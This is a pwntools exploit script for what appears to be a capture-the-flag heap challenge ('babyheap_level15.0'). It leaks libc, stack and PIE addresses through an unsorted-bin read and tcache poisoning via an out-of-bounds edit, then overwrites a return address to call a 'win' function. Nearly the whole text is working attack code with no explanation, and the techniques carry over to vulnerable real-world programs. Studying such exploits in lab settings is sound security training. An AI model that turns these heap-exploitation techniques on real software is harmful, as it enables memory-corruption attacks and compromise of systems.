from pwn import *

r = process('/challenge/babyheap_level15.0')

def malloc(idx,num):
    r.sendline(b'malloc')
    r.sendline(f'{idx}'.encode())
    r.sendline(f'{num}'.encode())

def free(idx):
    r.sendline(b'free')
    r.sendline(f'{idx}'.encode())

def edit(idx,size,s):
    r.sendline(b'read')
    r.sendline(f'{idx}'.encode())
    r.sendline(f'{size}'.encode())
    r.sendline(s)

def echo(idx,offset):
    r.sendline(b'echo')
    r.sendline(f'{idx}'.encode())
    r.sendline(f'{offset}'.encode())
    r.recvuntil(b'Data: ')

    return r.recvline().strip()

environ = 0x1ef2e0
win = 0x1b08


malloc(0,0x10)


for i in range(1,11):
    malloc(i,0x200)

for i in range(2,9):
    free(i)

## malloc for echo in order to not corrupt unsorted bin
malloc(15,0x20)
free(15)

## create unsortedbin and use ptr[0] to leak libc base
free(9)
free(1)  
libc = u64(echo(0,0x8*5)+b'\x00\x00') - 0x1ebbe0
print(hex(libc))

### leak stack 
malloc(2,0x30) ## use for oob read/write 
malloc(3,0x50)
malloc(4,0x50)
free(4)
free(3)

payload = p64(0) * 7 + p64(0x61) + p64(libc+environ)
edit(2,0x300,payload)
malloc(4,0x50)
malloc(3,0x50)

stack = u64(echo(3,0)+b'\x00\x00')-0x218 + 0x118
print(hex(stack))

## malloc at main_ret
malloc(2,0x30) ## use for oob read/write 
malloc(3,0x50)
malloc(4,0x50)
free(4)
free(3)
payload = p64(0) * 7 + p64(0x61) + p64(libc+environ)
edit(2,0x300,payload)

malloc(4,0x50)
malloc(3,0x50)

pie = u64(echo(3,0x8*4)+b'\x00\x00') - 0x1bc2 - 0x10c
print(hex(pie))

edit(3,0x30,p64(pie+win))
r.sendline(b'0')
r.interactive()